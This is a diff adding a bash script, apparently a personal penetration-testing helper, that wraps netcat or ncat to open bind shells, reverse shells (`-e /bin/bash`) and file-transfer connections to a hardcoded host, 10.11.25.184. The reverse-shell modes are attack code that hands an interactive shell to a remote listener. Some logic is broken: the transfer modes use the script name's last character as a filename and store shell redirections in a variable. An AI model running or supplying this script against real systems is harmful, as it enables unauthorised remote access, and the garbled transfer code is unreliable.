@@ -1,0 +1,111 @@
+#!/bin/bash
+PORT=3000
+HOST=10.11.25.184
+TYPE="-nv"
+NCTYPE="nc" # ncat
+SSL=""
+ 
+# Allows to call a host(listener) on given port to connect as a client
+# with option -e it executes a reverse shell when connecting to lisetener
+
+# A POSIX variable
+OPTIND=1         # Reset in case getopts has been used previously in the shell
+ADDITIONAL=""
+CONN_TYPE="client=bind"
+
+function usage {
+    echo -e "[help/usage] for Me $0"
+    echo -e "\t-a (nc or ncat with --ssl option)"
+    echo -e "\t-t conn-type (client[bind=1, reverse=2, transfer=3] or server[reverse=4, transfer=5, host=6])"
+    echo -e "\t-h host $IP"
+    echo -e "\t-p port $PORT"
+    echo -e "\t-e[1|0] - reverse shell /bin/bash (dangerous) [other side runs \"nc -nlvp $PORT\""
+    echo -e "\t-u[1:0] - Usage or this stuff you're looking at!"
+    echo -e "\t-s[1|0] - turns on ssl, enforced ncat usage!"
+    echo -e "\t-c[1|0] - initiate connection "
+}
+
+function connect {
+    echo -e "connecting... $NCTYPE $CONN_TYPE($TYPE) $HOST $PORT $SSL $ADDITIONAL"
+    $NCTYPE $TYPE $HOST $PORT $SSL $ADDITIONAL
+}
+
+if [ $# -eq 0 ]
+  then
+    usage
+fi
+
+while getopts ":a:t:u:h:p:e:s:c:" o; do
+    case "${o}" in
+        a) 
+            NCTYPE=$OPTARG
+            echo -e "[*] using program type: $NCTYPE"
+            ;;
+        t)
+            VAL=$OPTARG
+
+            if [ "$OPTARG" -eq "1" ]; then
+                echo "[*] setting to simple bind as client"
+                CONN_TYPE="client-bind"
+                TYPE="-nv"
+            elif [ "$OPTARG" -eq "2" ]; then
+                echo "[*] setting to reverse shell as client"
+                CONN_TYPE="client-reverse"
+                TYPE="-nv"
+                ADDITIONAL=" -e /bin/bash"
+            elif [ "$OPTARG" -eq "3" ]; then
+                echo "[*] setting to transfer file as client"
+                CONN_TYPE="client-transfer"
+                TYPE="-nv"
+                ADDITIONAL=" < ${0: -1}"
+            elif [ "$OPTARG" -eq "4" ]; then
+                echo "[*] setting to reverse shell as server"
+                CONN_TYPE="server-reverse"
+                HOST=""
+                TYPE="-nlvp"
+                ADDITIONAL=" -e /bin/bash"
+            elif [ "$OPTARG" -eq "5" ]; then
+                echo "[*] setting to store transfer file as server"
+                CONN_TYPE="server-transfer"
+                HOST=""
+                TYPE="-nlvp"
+                ADDITIONAL=" > ${0: -1}"
+            elif [ "$OPTARG" -eq "6" ]; then
+                echo "[*] setting to start as a server listenter"
+                CONN_TYPE="server-listener"
+                HOST=""
+                TYPE="-nlvp"
+                ADDITIONAL=""
+            fi
+            ;;
+        u)
+            usage
+            exit 0
+            ;;
+        h)
+            echo -e "[*] Host: $OPTARG"
+            HOST=$OPTARG
+            ;;
+        p)
+            echo -e "[*] Port: $OPTARG"
+            PORT=$OPTARG
+            ;;
+        e)
+            echo -e "[*] creating reverse shell for the host $HOST"
+            ADDITIONAL=" -e /bin/bash"
+            ;;
+        s)
+            echo -e "[*] ssl mode selected, switching to ncat"
+            NCTYPE="ncat"
+            SSL="--ssl"
+            ;;
+        c)
+            connect
+            exit 0
+            ;;
+    esac
+done
+shift $((OPTIND-1))
+
+exit;
+
